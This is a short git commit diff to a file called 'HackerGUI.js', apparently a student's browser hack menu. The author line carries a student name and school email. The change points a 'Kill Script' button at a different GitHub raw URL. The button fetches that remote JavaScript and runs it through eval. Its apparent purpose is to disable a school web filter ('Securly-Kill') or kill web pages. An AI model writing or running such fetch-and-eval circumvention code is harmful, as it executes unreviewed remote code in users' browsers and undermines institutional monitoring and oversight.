e8c03e4a0443e46ef85eefe43059acaa51a6ebdd
Alex236508 <alexander.berndt@students.puyallupsd.org>
2025-09-09 13:23:02 -0700

    HackerGUI.js

--- HackerGUI.js
+++ HackerGUI.js
@@ -316,7 +316,7 @@ function startXRaySafe() {
 
     // Kill Script
     addBtn(util,'Kill Script',()=>{
-        fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js")
+        fetch("https://raw.githubusercontent.com/Alex236508/Page-Killer/refs/heads/main/Website%20killer.js")
             .then(r=>r.text())
             .then(eval);
     });
